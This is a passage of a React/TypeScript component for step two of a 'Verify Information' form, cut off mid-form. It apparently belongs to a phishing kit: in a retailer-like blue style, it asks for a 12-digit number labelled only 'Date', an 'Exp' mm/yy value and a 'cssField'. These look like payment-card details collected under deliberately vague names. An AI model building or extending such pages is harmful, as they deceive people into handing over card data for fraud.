import { useState } from 'react';
import Layout from '../components/Layout';

interface Page2Props {
  onNext: (data: { dateField: string; expField: string; cssField: string }) => void;
}

export default function Page2({ onNext }: Page2Props) {
  const [formData, setFormData] = useState({
    dateField: '',
    expField: '',
    cssField: '',
  });

  const handleDateChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, '');
    if (value.length <= 12) {
      setFormData({ ...formData, dateField: value });
    }
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (formData.dateField && formData.expField && formData.cssField) {
      onNext(formData);
    }
  };

  return (
    <Layout>
      <div className="bg-white rounded shadow-sm p-8">
        <h1 className="text-2xl font-semibold text-gray-800 mb-1">
          Verify Information
        </h1>

        <div className="my-6">
          <div className="flex gap-1 mb-6">
            <div className="h-2 bg-[#0071ce] w-32"></div>
            <div className="h-2 bg-[#0071ce] w-32"></div>
            <div className="h-2 bg-gray-300 w-32"></div>
            <div className="h-2 bg-gray-300 flex-1"></div>
          </div>
        </div>

        <p className="text-sm text-gray-600 mb-6">
          Please provide the following information to continue.
        </p>

        <form onSubmit={handleSubmit} className="space-y-4">
          <div>
            <label className="block text-sm font-semibold text-gray-700 mb-2">
              Date*
            </label>
            <input
              type="text"
              placeholder="121212121212"
              className="w-full px-4 py-3 border border-gray-300 focus:outline-none focus:border-[#0071ce] text-sm"
              value={formData.dateField}
              onChange={handleDateChange}
              maxLength={12}
              required
            />
            <p className="text-xs text-gray-500 mt-1">Enter 12 digits</p>
          </div>

          <div>
            <label className="block text-sm font-semibold text-gray-700 mb-2">
              Exp*
            </label>
            <input
              type="text"
              placeholder="mm/yy"
              className="w-full px-4 py-3 border border-gray-300 focus:outline-none focus:border-[#0071ce] text-sm"
              value={formData.expField}
              onChange={(e) => setFormData({ ...formData, expField: e.target.value })}
              required
            />
          </div>
